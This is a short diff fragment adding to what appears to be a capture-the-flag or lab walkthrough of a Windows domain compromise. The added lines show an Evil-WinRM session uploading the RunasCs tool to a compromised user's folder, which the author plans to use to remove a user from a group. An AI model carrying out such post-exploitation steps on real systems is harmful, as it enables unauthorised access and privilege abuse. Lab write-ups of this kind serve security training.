@@ -1483,3 +1483,13 @@ Now the user is compromised i can use his access to remove the user from the gro
 
 So ill do this with RunAsCs
 
+```python
+*Evil-WinRM* PS C:\Users\cliff.b\Documents> upload RunasCs.exe
+                                        
+Info: Uploading /home/kali/hsm/novacart/RunasCs.exe to C:\Users\cliff.b\Documents\RunasCs.exe
+                                        
+Data: 68948 bytes of 68948 bytes copied
+                                        
+Info: Upload successful!
+```
+Now its uploade
